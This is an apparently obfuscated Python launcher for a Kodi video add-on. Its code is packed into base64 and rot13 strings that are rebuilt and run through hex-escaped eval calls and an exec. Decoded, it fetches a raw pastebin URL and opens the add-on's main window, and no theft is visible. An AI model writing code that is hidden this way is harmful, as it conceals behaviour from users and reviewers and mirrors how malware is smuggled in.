# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0jIyMjIyMjIyMjIyMjIyMjIyMjIyBTVEFSVCBBRERPTiBJTVBPUlRTICMjIyMjIyMjIyMjIyMjIyMjIyMjDWZyb20ga29kaV9zaXggaW1wb3J0IHhibWMsIHhibWNhZGRvbiwgeGJtY3BsdWdpbiwgeGJtY2d1aSwgeGJtY3Zmcw1mcm9tIHNpeCBpbXBvcnQgUFkyDQ1pbXBvcnQ'
love = 'tGJScot1coKOipaDtpzIkqJImqUZAnJ1jo3W0VUO5rTWgL3DhLJExo253nJ5xo3ptLKZtpUy4Lz1wqN1zpz9gVUWyp291pzAypl5fnJWmVTygpT9lqPO1pTEuqTIwnTIwnj1xnJSfo2ptCFO4Lz1wM3IcYxEcLJkiMltcQFZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZAVlZwVlZwVlZwVlZwVlZwVlZwVlZtH0IHVRSRER9BVR'
god = 'lEICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw1fYWRkb25faWRfICA9ICdwbHVnaW4udmlkZW8uRW50ZXJ0YWluTWUnDV9zZWxmXyAgPSB4Ym1jYWRkb24uQWRkb24oaWQ9X2FkZG9uX2lkXykNdXBkYXRlY2hlY2suY2hlY2t1cGRhdGVzKCkNdHJ5Og0JcGFzdGViaW51cmwgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2ZEeXEwVDYyJw0JbGluayA9IHJlcXVlc3RzLmdldChwY'
destiny = 'KA0MJWcoaIloPxhL29hqTIhqN1yrTAypUD6VUOup3ZAqUW5Bt0WGJScov5ALJyhI2yhMT93XPxAPKS1nKDbXD1yrTAypUD6QDykqJy0XPxAPJEcLJkiMl5inltvJ0ACGR9FVUWyMS1oDy1SJ0ACGR9FVUyyoTkiq11hqTIlITScovOAMIfiDy1oY0ACGR9FKFVfVygQG0kCHvOlMJEqDJExVT9hVRMunJkyMPOHolOFqJ4tD29hqTSwqPONGzIgrac5AwL4VR9hVSE3nKE0MKWoY0ACGR9FKFVc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))